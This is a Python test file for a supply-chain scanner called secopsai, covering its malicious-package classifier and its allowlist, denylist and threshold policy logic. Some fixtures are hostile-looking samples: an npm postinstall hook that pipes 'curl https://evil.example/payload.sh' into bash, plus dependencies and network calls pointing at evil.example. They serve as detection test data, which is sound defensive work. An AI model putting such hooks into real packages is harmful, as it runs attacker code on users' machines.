import sys
import tempfile
import unittest
from io import StringIO
from pathlib import Path
from unittest import mock


REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from secopsai import supply_chain
from secopsai import cli as secopsai_cli


class SupplyChainTests(unittest.TestCase):
    def test_build_finding_uses_stable_identifier(self):
        result = supply_chain.ScanResult(
            ecosystem="pypi",
            package="requests",
            old_version="2.31.0",
            new_version="2.32.0",
            verdict="malicious",
            analysis="Verdict: malicious suspicious code path",
            report_path="/tmp/report.md",
            rank=12,
            finding_id=supply_chain._finding_id("pypi", "requests", "2.32.0"),
        )
        finding = supply_chain._build_finding(result)
        self.assertEqual(finding["finding_id"], result.finding_id)
        self.assertEqual(finding["severity"], "critical")
        self.assertIn("requests@2.32.0", finding["title"])

    def test_load_recent_results_returns_most_recent_first(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            original = supply_chain.RESULTS_PATH
            supply_chain.RESULTS_PATH = Path(temp_dir) / "results.jsonl"
            try:
                first = supply_chain.ScanResult("pypi", "a", "1.0.0", "1.1.0", "benign", "", None, None, None)
                second = supply_chain.ScanResult("npm", "b", "2.0.0", "2.1.0", "malicious", "", None, None, "SCM-1")
                supply_chain._append_results([first, second])
                rows = supply_chain.load_recent_results(limit=2)
            finally:
                supply_chain.RESULTS_PATH = original

        self.assertEqual(rows[0]["package"], "b")
        self.assertEqual(rows[1]["package"], "a")

    def test_run_scan_can_emit_slack_alert(self):
        fake_result = supply_chain.ScanResult(
            ecosystem="pypi",
            package="requests",
            old_version="2.31.0",
            new_version="2.32.0",
            verdict="malicious",
            analysis="Verdict: malicious",
            report_path="/tmp/report.md",
            rank=10,
            finding_id="SCM-TEST",
        )
        with mock.patch.object(supply_chain, "_scan_release", return_value=fake_result), \
             mock.patch.object(supply_chain, "_append_results"), \
             mock.patch.object(supply_chain, "_upsert_findings", return_value="/tmp/test.db"), \
             mock.patch.object(supply_chain, "alert_new_supply_chain_findings", return_value={"new_findings": 1, "sent": True}) as alert_mock:
            payload = supply_chain.run_scan(
                ecosystem="pypi",
                package="requests",
                version="2.32.0",
                slack=True,
            )

        self.assertEqual(payload["slack_alerts_sent"], 1)
        alert_mock.assert_called_once()

    def test_classifier_flags_suspicious_npm_install_hook(self):
        report = """
## Artifact: npm-tarball

### `package.json`

```diff
+  "postinstall": "curl -fsSL https://evil.example/payload.sh | bash"
```
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "malicious")
        self.assertIn("install hook", analysis)

    def test_classifier_flags_pypi_artifact_divergence(self):
        report = """
## Artifact Divergence

- wheel_only_count=3
- sdist_only_count=0
- suspicious_wheel_only_files:
  - `package/backdoor.py`
  - `package/native_payload.so`
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "malicious")
        self.assertIn("artifact", analysis)

    def test_semantic_python_findings_detect_exec_and_network(self):
        source = """
import urllib.request
exec("print('x')")
urllib.request.urlopen("https://evil.example/payload")
"""
        findings = supply_chain._python_semantic_findings("payload.py", source)
        self.assertTrue(any("dynamic execution" in finding for finding in findings))
        self.assertTrue(any("outbound URL literal" in finding for finding in findings))

    def test_classifier_flags_semantic_findings_section(self):
        report = """
## Semantic Findings

- payload.py: python dynamic execution via exec()
- payload.py: python outbound URL literal https://evil.example/payload
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "benign")
        self.assertIn("semantic", analysis)

    def test_package_json_policy_findings_detect_lifecycle_and_remote_dep(self):
        source = """
{
  "scripts": {
    "postinstall": "curl -fsSL https://evil.example/payload.sh | bash"
  },
  "dependencies": {
    "left-pad": "https://evil.example/left-pad.tgz"
  },
  "bin": {
    "runner": "bin/runner.js"
  }
}
"""
        findings = supply_chain._package_json_policy_findings("package.json", source)
        self.assertTrue(any("lifecycle hook" in finding for finding in findings))
        self.assertTrue(any("non-registry source" in finding for finding in findings))
        self.assertTrue(any("bin" in finding for finding in findings))

    def test_setup_py_policy_findings_detect_cmdclass_and_exec(self):
        source = """
from setuptools import setup
import subprocess

setup(
    name="evilpkg",
    cmdclass={"install": object},
    entry_points={"console_scripts": ["evil=evil:main"]},
)

subprocess.run(["curl", "https://evil.example"])
"""
        findings = supply_chain._setup_py_policy_findings("setup.py", source)
        self.assertTrue(any("cmdclass" in finding for finding in findings))
        self.assertTrue(any("entrypoints" in finding or "entrypoints" in finding for finding in findings))
        self.assertTrue(any("execution or network-capable" in finding for finding in findings))

    def test_pyproject_policy_findings_detect_scripts_and_backend(self):
        source = """
[build-system]
requires = ["setuptools>=68"]
build-backend = "custom.backend"

[project]
dependencies = ["evilpkg @ https://evil.example/evilpkg.whl"]
scripts = { evil = "evil:main" }
"""
        findings = supply_chain._pyproject_policy_findings("pyproject.toml", source)
        self.assertTrue(any("console scripts" in finding for finding in findings))
        self.assertTrue(any("direct URL" in finding for finding in findings))
        self.assertTrue(any("custom build backend" in finding for finding in findings))

    def test_pyproject_policy_ignores_common_build_backend(self):
        source = """
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[project]
name = "normalpkg"
"""
        findings = supply_chain._pyproject_policy_findings("pyproject.toml", source)
        self.assertFalse(any("custom build backend" in finding for finding in findings))

    def test_classifier_flags_manifest_policy_findings(self):
        report = """
## Semantic Findings

- package.json: npm lifecycle hook runs remote or inline code (postinstall)
- package.json: npm dependency uses non-registry source (left-pad)
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "malicious")
        self.assertIn("manifest", analysis)

    def test_classifier_does_not_flag_outbound_url_alone(self):
        verdict, analysis = supply_chain._classify_report_text(
            """
```diff
+ https://docs.example/reference
```
"""
        )
        self.assertEqual(verdict, "benign")
        self.assertIn("No strong compromise indicators", analysis)

    def test_classifier_does_not_flag_console_scripts_alone(self):
        report = """
## Semantic Findings

- pyproject.toml: pyproject declares console scripts
"""
        verdict, _analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "benign")

    def test_classifier_ignores_common_build_backend_in_report_semantics(self):
        report = """
## Semantic Findings

- pyproject.toml: pyproject custom build backend hatchling.build
"""
        verdict, _analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "benign")

    def test_classifier_ignores_benign_artifact_divergence_paths(self):
        report = """
## Artifact Divergence

- wheel_only_count=4
- sdist_only_count=113
- suspicious_sdist_only_files:
  - `scripts/check_imports.py`
  - `tests/test_pkg.py`
  - `bench/run_bench.py`
"""
        verdict, _analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "benign")

    def test_classifier_ignores_prepublish_only_lifecycle_hook(self):
        report = """
## Semantic Findings

- package.json: npm lifecycle hook present (prepublishOnly)
- dist/embedder.js: javascript outbound network request
"""
        verdict, _analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "benign")

    def test_classifier_does_not_flag_outbound_and_subprocess_semantics_without_raw_exec_context(self):
        report = """
## Semantic Findings

- public/assets/js/app.js: javascript outbound network request
- public/assets/js/app.js: javascript subprocess-capable API
"""
        verdict, _analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "benign")

    def test_javascript_semantic_findings_do_not_treat_db_exec_as_subprocess(self):
        findings = supply_chain._javascript_semantic_findings(
            "dist/db/seed.js",
            "const stmt = db.prepare(`select 1`); db.exec(`pragma journal_mode = wal`);",
        )
        self.assertEqual(findings, [])

    def test_classifier_does_not_flag_unsuspicious_artifact_divergence_alone(self):
        report = """
## Artifact Divergence

- wheel_only_count=3
- sdist_only_count=1
"""
        verdict, _analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "benign")

    def test_changed_file_semantic_scan_uses_added_lines_only(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            old_path = Path(temp_dir) / "old.py"
            new_path = Path(temp_dir) / "new.py"
            old_path.write_text(
                "import subprocess\n\nsubprocess.run(['echo', 'hello'])\nvalue = 1\n",
                encoding="utf-8",
            )
            new_path.write_text(
                "import subprocess\n\nsubprocess.run(['echo', 'hello'])\nvalue = 2\n",
                encoding="utf-8",
            )
            findings = supply_chain._semantic_findings_for_changed_file("module.py", old_path, new_path)
        self.assertEqual(findings, [])

    def test_changed_minified_javascript_bundle_is_not_semantically_scanned(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            old_path = Path(temp_dir) / "old.js"
            new_path = Path(temp_dir) / "new.js"
            old_path.write_text(
                'const a="1.1.35";function x(){return window.location.href}var repo="git+https://github.com/example/repo.git";',
                encoding="utf-8",
            )
            new_path.write_text(
                'const a="1.1.36";function x(){return window.location.href}var repo="git+https://github.com/example/repo.git";',
                encoding="utf-8",
            )
            findings = supply_chain._semantic_findings_for_changed_file("bundle.js", old_path, new_path)
        self.assertEqual(findings, [])

    def test_artifact_divergence_ignores_src_layout_and_docs(self):
        artifact_reports = {
            "bdist_wheel": {
                "files_new": {
                    "pkg/__init__.py": Path("/tmp/pkg/__init__.py"),
                    "pkg/core.py": Path("/tmp/pkg/core.py"),
                }
            },
            "sdist": {
                "files_new": {
                    "src/pkg/__init__.py": Path("/tmp/src/pkg/__init__.py"),
                    "src/pkg/core.py": Path("/tmp/src/pkg/core.py"),
                    "docs/example.py": Path("/tmp/docs/example.py"),
                    "tests/test_pkg.py": Path("/tmp/tests/test_pkg.py"),
                }
            },
        }
        lines = supply_chain._summarize_artifact_mismatch(artifact_reports)
        self.assertEqual(lines, [])

    def test_policy_denylist_forces_malicious(self):
        policy = {
            "thresholds": {"malicious_score": 99},
            "allow": {"packages": []},
            "deny": {"packages": ["pypi:requests"]},
        }
        verdict, analysis = supply_chain._classify_report_text(
            "No strong signals",
            ecosystem="pypi",
            package="requests",
            policy=policy,
        )
        self.assertEqual(verdict, "malicious")
        self.assertIn("denylist", analysis)

    def test_policy_allowlist_forces_benign(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "allow": {"packages": ["pypi:requests"]},
            "deny": {"packages": []},
        }
        verdict, analysis = supply_chain._classify_report_text(
            "https://evil.example eval exec",
            ecosystem="pypi",
            package="requests",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")
        self.assertIn("allowlist", analysis)

    def test_policy_threshold_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 10},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "https://evil.example eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")

    def test_package_threshold_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 10},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {"pypi:sample": 1},
            "rules": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "https://evil.example eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "malicious")

    def test_rule_toggle_disables_signal(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "ecosystem_thresholds": {},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {"obfuscated eval": False},
            "rule_weights": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")

    def test_ecosystem_threshold_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "ecosystem_thresholds": {"pypi": 10},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
            "rule_weights": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "https://evil.example eval",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")

    def test_rule_weight_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 5},
            "ecosystem_thresholds": {},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {"obfuscated eval": True},
            "rule_weights": {"obfuscated eval": 5},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "malicious")

    def test_explain_policy_reports_exact_package_threshold(self):
        policy = {
            "thresholds": {"malicious_score": 6},
            "ecosystem_thresholds": {"pypi": 7},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {"pypi:requests": 9},
            "rules": {"obfuscated eval": False},
            "rule_weights": {"obfuscated eval": 5},
        }
        payload = supply_chain.explain_policy("pypi", "requests", policy=policy)
        self.assertEqual(payload["effective_threshold"], 9)
        self.assertEqual(payload["precedence"], ["package_threshold"])
        self.assertEqual(payload["matched_package_threshold"]["entry"], "pypi:requests")
        self.assertIn("obfuscated eval", payload["disabled_rules"])
        self.assertEqual(payload["rule_weight_overrides"]["obfuscated eval"], 5)

    def test_explain_policy_reports_wildcard_threshold_and_allowlist(self):
        policy = {
            "thresholds": {"malicious_score": 6},
            "ecosystem_thresholds": {"npm": 8},
            "allow": {"packages": ["npm:@your-org/*"]},
            "deny": {"packages": []},
            "package_thresholds": {"npm:@your-org/*": 10},
            "rules": {},
            "rule_weights": {},
        }
        payload = supply_chain.explain_policy("npm", "@your-org/pkg", policy=policy)
        self.assertEqual(payload["effective_threshold"], 10)
        self.assertIn("npm:@your-org/*", payload["allow_matches"])
        self.assertEqual(payload["precedence"], ["allowlist"])

    def test_explain_verdict_reports_matched_rules_and_weights(self):
        policy = {
            "thresholds": {"malicious_score": 5},
            "ecosystem_thresholds": {},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
            "rule_weights": {"obfuscated eval": 5},
        }
        payload = supply_chain.explain_verdict(
            "eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(payload["verdict"], "malicious")
        self.assertEqual(payload["score"], 5)
        self.assertEqual(payload["matched_rules"][0]["rule"], "obfuscated eval")
        self.assertEqual(payload["matched_rules"][0]["weight"], 5)

    def test_explain_verdict_reports_allowlist_context(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "ecosystem_thresholds": {},
            "allow": {"packages": ["pypi:requests"]},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
            "rule_weights": {},
        }
        payload = supply_chain.explain_verdict(
            "https://evil.example eval",
            ecosystem="pypi",
            package="requests",
            policy=policy,
        )
        self.assertEqual(payload["verdict"], "benign")
        self.assertIn("allowlist", payload["analysis"])
        self.assertEqual(payload["allow_matches"], ["pypi:requests"])
        self.assertEqual(payload["policy"]["precedence"], ["allowlist"])

    def test_cli_explain_verdict_resolves_stored_report(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            report_path = Path(temp_dir) / "report.md"
            report_path.write_text("eval\n", encoding="utf-8")
            results = [{
                "ecosystem": "pypi",
                "package": "requests",
                "new_version": "2.32.0",
                "report_path": str(report_path),
            }]
            stdout = StringIO()
            with mock.patch.object(secopsai_cli, "load_recent_results", return_value=results), \
                 mock.patch("sys.stdout", stdout):
                exit_code = secopsai_cli.main([
                    "--json",
                    "supply-chain",
                    "explain-verdict",
                    "--ecosystem",
                    "pypi",
                    "--package",
                    "requests",
                    "--version",
                    "2.32.0",
                ])

        self.assertEqual(exit_code, 0)
        output = stdout.getvalue()
        self.assertIn('"verdict": "benign"', output)
        self.assertIn('"report_path":', output)
        self.assertIn('"matched_rules"', output)


if __name__ == "__main__":
    unittest.main()
